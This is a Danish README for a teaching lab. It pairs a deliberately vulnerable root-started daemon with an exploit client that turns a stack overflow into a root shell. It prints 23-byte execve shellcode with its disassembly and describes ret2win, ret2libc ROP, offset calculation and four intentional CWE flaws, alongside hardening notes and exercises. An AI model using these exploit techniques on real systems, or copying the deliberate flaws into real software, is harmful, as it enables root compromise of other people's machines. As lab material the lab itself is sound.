# `wosuid`-laboratoriet — root-RCE **uden** setuid-bit

```
  foowosd   en bevidst sårbar daemon, der er root, fordi den blev *STARTET* som
            root  (port 2344, kun loopback som standard)
  foowosc   exploitet: forvandler et stack-overløb til en **root**-shell ved at
            udføre shellcode — de samme 23 bytes, der knækkede user-level-
            `food`-daemonen i det overordnede laboratorium
```

Det er det tredje laboratorium i serien. Samme exploit-værktøjskæde, samme
stil, én fundamental forskel:

| Laboratorium | hvordan target-processen bliver root              | `uid=0(root)`-shell? |
|----------|------------------------------------------------|----------------------|
| food/fooc| aldrig — det er en almindelig user-daemon       | nej                   |
| foosd/foosc | SUID-bitten (`chmod u+s`) — euid 0, ruid 1000 | ja (kræver `setreuid` i shellcoden, fordi bash nulstiller euid→ruid) |
| **foowosd/foowosc** | **ingen — root *starter* daemonen** (sudo / systemd `User=root`) | **ja (almindelig `execve`-shellcode)** |

Setuid-bitten er et *transportmiddel* for privilegier — ikke privilegierne
selv. En daemon startet af root har reelle, effektive og gemte uid alle lig 0.
For kernen er det root, punktum; den kan og vil ikke vide, om processen kom
derhen via `+s` på en fil eller via `sudo ./foowosd`. Overløbet i en
root-started daemon er altså et root-exploit — *"jeg har ingen
SUID-binærfiler" er ikke det samme som "jeg er ikke udnyttelig".*

Det er hele lektionen i dette laboratorium. Alt herunder er maskineriet.

---

## Hurtig start (hvad brugeren bad om)

```
cd wosuid
make                 # bygger daemonen, exploitet og test-harnessen
```

### Det ægte — kør daemonen som **root**

```
sudo make run-root      # starter foowosd som uid 0 (proces, ikke filtilstand)
make test-root          # hver teknik skal nu give uid=0(root)
```

### Ikke sudo? Den identiske kernel-sti via en user-namespace

```
make run-root-ns        # uid 0 i en user-namespace — ingen adgangskode nødvendig
make test-root          # samme domme; bruges af CI og alle uden sudo
```

### Baseline — daemon som din normale bruger (intet root nogen steder)

```
make run                # foowosd kører med dine uider
make test               # exploits lander shells, men `root` forventes MISSING
```

### Oprydningsritual (altid: dette er et root-shell-laboratorium)

```
make stop
```

`foowosd` er *ikke* setuid, og intet i dette bibliotek laver nogensinde
`chmod +s` — det er pointen. Den farlige tilstand er **processen**, ikke
filen.

---

## Når du bliver bedt om at sætte SUID-bitten

Det kommer du **ikke** til. Dette laboratorium har bevidst ingen SUID-bit:

- `foowosd` bygges, ejes og har almindelige tilstande som ethvert andet program.
- Det bliver root, som rigtige daemoner gør — ved at blive *startet* af root.
- `make run-root` bruger `sudo` til præcis det, og `make run-root-ns` får en
  ægte uid-0-proces helt uden noget af det.

Suid-bitten tilhører *søster*-laboratoriet (`foosd`). Kontrasten mellem de to
er pensum:

1. SUID-laboratoriet: bitten giver **euid 0, men ruid 1000** →
   `execve("/bin/sh")` nedgraderes af bashs vagt (`euid != ruid` → reset) →
   shellcoden må først kalde `setreuid(0,0)` (32-byte-payload).
2. Dette laboratorium: root **starter** processen → **ruid == euid == 0** →
   vagten har intet at nulstille → den almindelige 23-byte `execve`-shellcode
   beholder root.

Samme overløb. Samme teknik. Forskellig *oprindelse* af privilegier, anderledes
payload-form. Det er lektionen i miniature.

---

## Protokollen

Uanset hvilken slags klient der forbinder, hilser foowosd på den med:

```
FOOWOSD 1.0 ids=0/0 leak stack=0x7ffd… libc=0x7f…      (banneret + leaks)
BUF=0x7ffd…                                             (bufferadressen)
```

`ids=euid/ruid` er *"er jeg root?"*-sidekanalen. foowosc printer en høj
advarsel, når euid ikke er 0 (dvs. du startede daemonen som en almindelig
bruger): payloaden lander stadig, men shellen bliver en bruger-shell, og at
kalde exploitet "i stykker" ville være forkert — det eskalerer bare ikke.

> Staveform-bemærkning: `ids=`, ikke `euid=`/`ruid=`. Test-harnessen beviser et
> levende `id` ved at matche den bogstavelige form `uid=NNN(`, så banneret må
> aldrig indeholde en delstreng, der selv opfylder tjekket. (I SUID-laboratoriet
> producerede præcis den fælde et spektakulært falsk positivt.)

---

## Exploit-teknikkerne (`foowosc -t …`)

Alle fire exploit-stier nedenfor virker mod foowosd. Når daemonen er root,
giver **alle, der spawner noget, root** — i modsætning til SUID-laboratoriet,
hvor ret2win/ret2libc stille og roligt blev nedgraderet til uid 1000 af bashs
vagt. Her er der intet mismatch at vogte mod.

| `-t`          | hvad der sker                                                       | når daemonen er root |
|---------------|---------------------------------------------------------------------|---------------------|
| `shellcode`   | 23-byte-`execve("/bin/sh", NULL, NULL)` kører på stacken.           | **root-shell** (standard) |
| `ret2win`     | hop til `win()` → `execl("/bin/sh")`                                | **root-shell** |
| `ret2libc`    | ROP: `pop rdi; ret` → `"/bin/sh"` → `system()`                      | **root-shell** |
| `demo`        | kun junk-overløb — forvent et SIGSEGV i daemon-loggen               | nedbrud, efter design |
| `leak`        | printer bare leaks, sender ingen payload                            | n/a |

```
./foowosc -t shellcode       # interaktiv; standard-target 127.0.0.1:2344
./foowosc -t shellcode -n    # send og rapporter, ingen interaktiv session
```

En vellykket interaktiv session videresender din terminal til shellen *på
offeret* — der er præcis én shell i billedet, og det er `/bin/sh`, der kører
som root inde i foowosd. Skriv `id` for at se `uid=0(root)`.

### Hvorfor der ikke er nogen `ret2win-root`-teknik her

foosc havde én — den hoppede til et `win_root()`, der kaldte `setreuid(0,0)`
før exec, fordi en setuid-proces kørte med en reelle uid, der stadig sagde
1000. En root-*startet* proces har den reelle uid allerede 0; der er intet at
rydde, så den ekstra funktion og teknik ville ikke lære noget. Fjernet.

---

## Hvad foowosc gør, trin for trin

1. **Statisk analyse** — `objdump -d` af `./foowosd`. Finder
   `vulnerable_handler`, `win()`, det `lea -0x50(%rbp)`, der adresserer `buf`,
   og det første nøgne `ret`. Ud fra forskydningen beregner det
   `rip_off = 80 + 8 = 88`. Intet er hardkodet; det overlever en genbygning.
2. **Selv-introspektion** — læser sit eget `/proc/self/maps` og `dlsym()`er
   `system`/`read` for at lære libc-*offsets*. Targetets libc-base er
   `leaked_read − off_read`, derefter `system = base + off_system`, osv. Denne
   delta-aritmetik er grunden til, at exploits overlever libc-versioner.
3. **Forbind** — læser banneret/leaks (`ids=`, `stack=`, `libc=`, `BUF=`).
4. **Byg payloaden** — for `shellcode`: 23 bytes maskinkode, padding til
   `rip_off`, derefter den gemte RIP = `buf` (så `ret` hopper ind på koden). For
   `ret2win`/`ret2libc`: adresser beregnet ud fra analysen — ingen udførelse af
   stacken nødvendig.
5. **Justeringsfixen** — et kapret nøgent `ret` giver callee'en
   `rsp ≡ 8 (mod 16)`, og glibcs SSE2-kode `movaps`-fault'er på en ikke-justeret
   stack (crash-reporteren logger `si_addr=(nil)` — fingerpeget). foowosc
   indsætter ét ekstra `ret`-gadget før det rigtige target og genopretter
   invarianten. Silkehandsketeknik i et shellcode-laboratorium, men det er
   forskellen mellem en payload, der "nogle gange virker", og en, der altid
   virker.
6. **Send, derefter videresend** — offerprocessen *er* shellen; denne proces
   splisser kun bytes. Ingen lokal shell, ingen anden læser — single-read-
   cursor-fejlen (ét spist byte per chunk) er dokumenteret i `become_shell()`.

---

## Daemonens bevidste fejl (alle i `foowosd.c`, alle ægte CWE-klasser)

| # | fejl | CWE | note |
|---|-----|-----|------|
| 1 | `read(fd, buf, 512)` ind i et 64-byte stack-buffer | CWE-120 | overløbet: 448 bytes forbi `buf`, gemt RIP ved +88 |
| 2 | kun `snprintf(line, …, "%.*s", …)`; men angriber-`%` i echo-stien | CWE-134 | leaket er her den reelle payload; et `%n` i en *root*-proces ville være write-what-where som root |
| 3 | børn beholder root, mens de håndterer utroverdige inputs | CWE-271 | det korrekte `drop_privs()` (setgroups→setgid→setuid, i den rækkefølge, med verifikation) står i filen, kommenteret, *bevidst aldrig kaldt* |
| 4 | `ids=`, `stack=`, `libc=`, `BUF=` afsløret til enhver klient | CWE-200 | uden disse leaks kunne shellcode- og ret2libc-teknikkerne ikke beregne adresser (ASLR ville besejre dem) |

Handleren har præcis samme `buf[64]`/`read(512)`-form som de to andre
laboratorier, så den fælles objdump-baserede erkendelsespipeline virker
uændret.

---

## Sådan inspicerer du daemonen (læringssti)

```
make status            # kører den? som hvilken uid? filtilsand vises
make run-root          # eller run / run-root-ns
./foowosc -t leak      # se banneret og leaks, send intet
./foowosc -t demo      # junk-overløb -> SIGSEGV, logget med RIP/rsp
./foowosc -t shellcode # den interaktive root-shell
make test-root         # fuld matrix, alle teknikker, --must-root
```

Crash-reporter: Ved SIGSEGV logger daemonen fejladressen, RIP og RSP. Et `ret`
ind i en ikke-kanonisk `0x4141…` fault'er ved `ret`-et selv (RIP som `0x4028xx`,
`si_addr=(nil)`) — værd at vide, før du fejllæser en loglinje som en
NULL-dereference.

---

## Hvorfor shellcoden er 23 bytes, ikke 32

```
31 f6        xor esi, esi            ; argv = NULL
31 d2        xor edx, edx            ; envp = NULL
48 bf 2f62696e2f736800 movabs rdi, "/bin/sh\0"
57           push rdi
48 89 e7     mov rdi, rsp
6a 3b        push 0x3b               ; 59 = execve
58           pop rax
0f 05        syscall
```

SUID-laboratoriet har brug for `setreuid(0,0)` foran dette. Dette
laboratorium ikke, af den grund der gentages overalt: **ruid er allerede 0**,
fordi root startede processen. `make verify` beviser, at bytes i `foowosc.c`
er byte-for-byte det, `shellcode.S` assemblerer til.

---

## Modforanstaltninger — hvad `make hardened` ændrer

Hærdet build (`-fstack-protector-strong -fPIE -pie -z noexecstack`):

| teknik | sårbar `foowosd` | hærdet `foowosd_hardened` |
|-----------|----------------------|------------------------------|
| `shellcode` | root-shell (eksekverbar stack) | SIGSEGV ved canary-tjekket / NX |
| `ret2win` / `ret2libc` | root-shell | canary abort'er `ret` — men bemærk: en *PIE*-build gør også disse adresser tilfældige |
| `demo` | SIGSEGV, logget | SIGSEGV, logget |

`make test-hardened` demonstrerer det live. Den vigtige observation er ikke
bare, at modforanstaltningerne dræbte teknikkerne — det er, at de **ikke**
gjorde daemonen til "ikke-root". En hærdet build, der stadig *startes* som
root, er stadig en root-daemon; modforanstaltningen hæver kun barren for
angriberen. Least privilege (`drop_privs()`) og hukommelsessikkerhed er to
forskellige fejl, og en daemon, der ikke behøver root, bør ikke have det.

---

## Sikkerhedsgelændere (samme politik som SUID-laboratoriet)

- **Kun loopback.** foowosd nægter at binde andet end `127.0.0.1` /
  `localhost` / `::1`, medmindre du giver `-L`. En root-daemon på en rigtig
  grænseflade er en *fjern* root-tjeneste. `-L` findes kun for at vise vagten;
  brug den ikke på noget, der betyder noget.
- **Tilstanden logges højt.** Ved start printer den `ruid/euid` og om dette er
  en root-proces, så du altid ved, hvilket exploit-resultat du skal forvente.
- **Domme kommer fra exit-status** i `make test*` (pty-harnessens
  returkode), aldrig fra at greppe dens stdout — grebbart output lyver.
- **pty'en skal køre cooked + ECHO off**, ellers ekkoer harnessen sin egen
  kommandolinje og forfalsker markøren. Harnessen slår ECHO fra og beholder
  ECHONL på.
- **Oprydningsritual:** `make stop` efter hver session. Hvis daemonen er
  root-ejet, siger `stop` dig at køre `sudo pkill -x foowosd`.
- Kør aldrig dette på en host, du holder af. Det findes for at uddele
  `uid=0`-shells over loopback-grænsefladen.

---

## Øvelser

1. Kør `make run` (user-daemon), derefter `./foowosc -t shellcode`. Hvorfor er
   shellen ikke root? (Tjek `ids=` i banneret — foowosc siger dig det, før du
   overhovedet forbinder.)
2. `make stop && sudo make run-root && make test-root`. Forklar ud fra
   bannerlinjen, hvorfor alle fire teknikker nu giver `uid=0(root)`.
3. Find i `foowosd.c` `drop_privs()` og læs, *hvorfor rækkefølgen* af
   `setgroups → setgid → setuid` betyder noget. Beslut, hvor i `main()` den
   ville høre hjemme, og hvad laboratoriets angrebsflade bliver, når den
   faktisk kaldes.
4. Beregn `rip_off` i hånden ud fra `objdump -d foowosd`: find `buf`s
   `lea -0xNN(%rbp)` inde i `vulnerable_handler`, derefter `NN + 8`. foowosc
   gør præcis det; tjek dens regnestykke mod dit eget.
5. `make hardened && make test-hardened`. Hvilken teknik falder for canaryen,
   og hvilken for NX? Hvorfor ændrer hærdning ikke, hvad `make status`
   rapporterer om *processen*?
6. Sammenlign de to laboratoriers shellcodes: 23 bytes her, 32 for foosd. Hvad
   gør de ekstra 9 bytes, og hvorfor behøves de kun i SUID-tilfældet?
7. Læs `become_shell()`s kommentar om den enkelte læse-cursor. Genskab
   fiaskotilstanden mentalt: to læsere på én socket betyder, at login-shellen
   æder ét byte per chunk — "uid=1000…" ankommer som "id=1000…". Hvorfor kan en
   relay-proces aldrig have denne fejl?

---

## Filer

```
foowosd.c                 den sårbare root-daemon (hver linje kommenteret)
foowosc.c                 exploitet (hver linje kommenteret)
shellcode.S               reference-assembly for 23-byte-payloaden
tests/pty_wosuid_test.c   pty-harnessen (markør + strenge id-form-tjek)
Makefile                  build / run / run-root / run-root-ns / test /
                          test-root / verify / hardened / clean …
```

Søster-laboratorier: `../food.c`/`../fooc.c` (user-level-baseline, port 2342)
og `../suid/` (SUID-root-daemon `foosd`/`foosc`, port 2343). Portene er bevidst
forskellige — du kan køre alle tre på én gang og krydstjekke deres `ids=`-linjer
i banneret.